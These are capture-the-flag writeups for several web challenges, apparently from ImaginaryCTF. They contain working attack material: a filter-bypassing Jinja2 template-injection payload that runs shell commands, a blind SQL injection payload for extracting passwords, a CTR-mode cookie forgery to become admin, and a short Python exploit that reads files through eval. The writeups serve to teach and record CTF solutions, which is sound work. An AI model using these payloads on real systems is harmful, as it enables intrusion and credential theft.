

# Web Challenges

Writeups in this file only give a brief description. 
### Roos World
Open the Javascript Console (`F12`) and see the flag.

### Build-a-website
It uses `render_template_string` and we have control over this template. So we can do `Server Side Template Injection`.  I used the payload from [here](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/). Just needed to adapt the command to execute and `bal` (as in `globals`) is blocked, so we use hex repesention `\x61` for the `a`.
````{{request['application']['\x5f\x5fglob\x61ls\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('cat flag.txt')['read']()}}````


### SaaS
We use `-f+fla*` . `-f` executes the next file as a script and `flag` is forbidden, so we use a shell wildcard to match it.

### Awkward Bypass
This is a Blind SQL injection, but we need to bypass the filter. When we want an `OR`, we can write `OwithoutR`, because the `without` is a keyword and thus replaced. The remaining `OR` is not checked again.
How do we get the password? Maybe there are other options, but the only way to retrieve information about the database was: If the query returns at least one result, we are logged in, otherwise not. Our injection looks like this:
``` ' OR UNICODE(SUBSTR(password, {pos}, {pos})) > {mid};--```

 - `' OR <stuff>;--` End the username (`'`), end the query and comment out the rest (`;--`). If `<stuff>` is true, all results are returned (and we are logged in), otherwise, no results are returned (and we are not logged in). 
 - `UNICODE(SUBSTR(password, {pos}, {pos}))` where `{pos}` is replaced with the current character of the password we want to retrieve, so `0, 1, 2, ...`. This part extracts the specified character from the password and gets its ASCII value.
 - `> {mid}` We could simply compare this letter with the ascii values for all possible characters one by one. But we can improve this using `Binary Search`. If we choose `mid = 128` and we are logged in, it means the character has a value larger than 128 (so between 129 and 255). Now we try with `mid = 192` to know if it is in the range (129-192) oder (193-255). We repeat this until the possible range has size 1. 8 queries are enough to do this.

### Cookie Stream

 1. There are several users with passwords. Some of same can easily be cracked, e.g. `Eth007` is `supersecure`.
 2. We log in with this user and get the `auth`-cookie. It contains the `nonce` and the encrypted username
 3. CTR-Mode computes a value `K` that is xor-ed with the plaintext to get the ciphertext. This `K` is independent of the ciphertext used, but depends on the `nonce` and the `key`.  (Loop up the great images on Wikipedia to visualize this)
 4. The cipher text is `cipher = xor(plain, K)`. From step 2, we know `cipher` and we know our `plain`, so we can compute `K = xor(cipher, plain)`.
 5. Decrypt is very similar: `plain = xor(cipher, K)`, we know `K` and we want `plain = pad("admin")` the padded admin string. Now we can `cipher = xor(plain, K)`
 6. Built a cookie with the same `nonce` and the new `cipher` that results in `admin` in the end.

### NumHead
There is some code involved, but we don't need everything. Let's try to understand what is going on:
- There are two files with endpoints. We clearly want `/flag`.
- I had to read a bit about the flagapi and how authentication is done there. In the end, I figured it out: I provide a Header-Field `authroziation`. For `/new-token`, the value is the magic value from the config, for the other endpoints, it is the token generated with `/new-token`.
- We can now login and get the `get_flag` called, but it seems we need more points.
- There is a number guessing game, that gives us points. There is a better way, but for completeness, let's discuss this first: We need to guess a number between 1 and 100 in not more than 5 steps. If we are correct and the number is odd, we get 1 points. With the classical `binary search`, we can reduce the number of options to about 6 values after 4 steps. Chances to guess correctly are not that bad. About every 6th game will be the correct answer (and we only guess odd numbers, so every 6th game gives us 1 point. So we need 1000 * 6 games, times 5 tries per game. Given the rate limiting, this will run for a lot of hours but succeed easily within the contest.
- Now to the better version: There is an endpoint `/nothing-here` (and it can be found by finding locations where our points are incremented and going backwards the call chain). If we read the code (takes some time to understand), we see that we get 100 points, when our request has a header field, that was not used previously.
- So, we just make 10 requests, each with more headers than before and with a one we never used before. (Note that headers can be every string, not just the 'common' ones)

### Sinking Calculator
Just like in `Build-a-website`, there is a server side template injection, because we control the template string. However, there are a few restrictions:
1. The query must not exceed 80 bytes (mine in `build-a-website` is about 90-100)
2. `args`, `headers` and `cookies` are dropped befor the template is evaluated
3. the result can only contain digits and dashes
First, lets get arbitrary code execution with the query `request.application.__globals__.__builtins__['eval'](request.data)`
So we find the `eval` method and pass the content of the request data to it (They cleared args, headers and cookies, but left the data untouched. Fools :) ). Now we can write quite everything there without length restrictions.
How to bypass the third point? We convert our string to a sequence of integers. So `105-99-116-102` stands for `ictf` and all characters are allowed. The final exploit is very short
```python
import requests
url = "https://sinking-calculator.chal.imaginaryctf.org"
query = "request.application.__globals__.__builtins__['eval'](request.data)"
cmd = "'-'.join(map(str,open('flag','rb').read()))"
res = requests.get(url + "/calc?query=" + requests.utils.quote(query),data=cmd).text
print("".join(map(chr, map(int, res.split("-")))))
```
